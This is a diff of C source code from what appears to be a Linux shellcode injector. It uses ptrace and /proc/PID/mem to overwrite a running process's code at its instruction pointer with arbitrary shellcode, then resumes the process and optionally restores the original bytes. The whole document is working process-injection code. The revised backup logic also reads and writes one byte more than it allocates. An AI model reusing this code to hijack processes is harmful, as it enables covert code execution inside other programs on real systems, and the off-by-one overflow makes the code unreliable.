@@ -1,20 +1,36 @@
 #include "inject.h"
 
-void ptrace_inject(const char *sc, size_t len, mypid_t pid, int nonsave){
-	struct user_regs_struct regs;
-	char *instructions_backup, memfile[100];
-	int status, memfd;
 
-	info("Attaching process %s\n", pid.str);
-	if( ptrace(PTRACE_ATTACH, pid.number, NULL, NULL) ==  - 1){
-		bad("failed to attach pid %s | %s\n", pid.str, strerror(errno));
+void ptrace_attach(pid_t pid){
+	int status;
+
+	if( ptrace(PTRACE_ATTACH, pid, NULL, NULL) ==  - 1){
+		bad("failed to attach pid %d | %s\n", pid, strerror(errno));
 		exit(1);
 	}
-	waitpid(pid.number, &status, 0);
 
-	ptrace(PTRACE_GETREGS, pid.number, NULL, &regs);
+	waitpid(pid, &status, 0);
 
+}
+
+inline long getip(pid_t pid){
+	return ptrace(PTRACE_PEEKUSER, pid, sizeof(long)*IP, 0L);
+}
+
+inline long setip(pid_t pid, long ip){
+	return ptrace(PTRACE_POKEUSER, pid, sizeof(long)*IP, ip);
+}
+
+void ptrace_inject(const char *sc, size_t len, mypid_t pid, int nonsave){
+	char *instructions_backup, memfile[100];
+	int status, memfd;
+	long instruction_point;
+
+	info("Attaching process %s\n", pid.str);
+	ptrace_attach(pid.number);
 	good("process attached\n");
+
+	instruction_point = getip(pid.number);
 
 	info("opening /proc/%s/mem\n", pid.str);
 	snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);
@@ -25,29 +41,26 @@ void ptrace_inject(const char *sc, size_t len, mypid_t pid, int nonsave){
 	if(!nonsave){
 		instructions_backup = xmalloc(len);
 		info("backup previously instructions\n");
-		pread(memfd, instructions_backup, len, regs.REGISTER_IP);
+		pread(memfd, instructions_backup, len+1, instruction_point);
 	}
 
 	info("writing shellcode on memory\n");
-	pwrite(memfd, sc, len, regs.REGISTER_IP);
+	pwrite(memfd, sc, len, instruction_point);
 	good("Shellcode inject !!!\n");
-
-	regs.REGISTER_IP += 2;
-	ptrace(PTRACE_SETREGS, pid.number, NULL, &regs);
 
 	if(!nonsave){
 		info("resuming application ...\n");
-		pwrite(memfd, "\xcc", 1, regs.REGISTER_IP+len-1);
+		pwrite(memfd, "\xcc", 1, instruction_point+len);
 
 		ptrace(PTRACE_CONT, pid.number, NULL, 0);
 		waitpid(pid.number, &status, 0);
 
 		info("restoring memory instructions\n");
-		pwrite(memfd, instructions_backup, len, regs.REGISTER_IP-2);
+		pwrite(memfd, instructions_backup, len+1, instruction_point);
 
 		xfree(instructions_backup);
 
-		ptrace(PTRACE_SETREGS, pid.number, NULL, &regs);
+		setip(pid.number, instruction_point);
 	}
 
 	info("detaching pid ...\n");
